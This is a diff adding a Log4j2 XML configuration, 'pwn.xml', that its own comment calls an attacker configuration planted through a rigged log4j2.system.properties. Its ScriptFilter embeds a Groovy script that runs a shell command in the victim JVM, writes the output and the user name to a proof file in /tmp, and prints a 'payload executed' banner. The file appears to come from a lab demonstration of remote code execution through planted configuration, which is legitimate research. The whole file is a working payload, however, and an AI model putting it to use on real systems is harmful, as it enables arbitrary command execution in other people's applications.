@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Attacker configuration, shipped as a classpath resource next to log4j2.system.properties.
+  Log4j loads it because the planted system property points the configuration file
+  property at "pwn.xml", and the planted log4j2.Script.enableLanguages=Groovy enables
+  the script engine that the filter below uses.
+-->
+<Configuration status="WARN" name="attacker">
+  <Filters>
+    <ScriptFilter onMatch="NEUTRAL" onMismatch="NEUTRAL">
+      <Script language="groovy" scriptText="def proc = 'id'.execute(); proc.waitFor(); def sb = new StringBuffer(); proc.in.eachLine { sb &lt;&lt; it + '\n' }; def proof = new File('/tmp/log4j-lab-pwned.txt'); proof.text = 'RCE via planted log4j2.system.properties (classpath pre-positioning) as ' + System.getProperty('user.name') + '\n' + sb.toString(); println '=== PAYLOAD EXECUTED IN VICTIM JVM (planted config) ==='; println proof.text; println '=== END PAYLOAD ==='; true"/>
+    </ScriptFilter>
+  </Filters>
+  <Appenders>
+    <Console name="Console" target="SYSTEM_OUT">
+      <PatternLayout pattern="%d{HH:mm:ss} %-5level %logger{1} - %msg%n"/>
+    </Console>
+  </Appenders>
+  <Loggers>
+    <Root level="info">
+      <AppenderRef ref="Console"/>
+    </Root>
+  </Loggers>
+</Configuration>
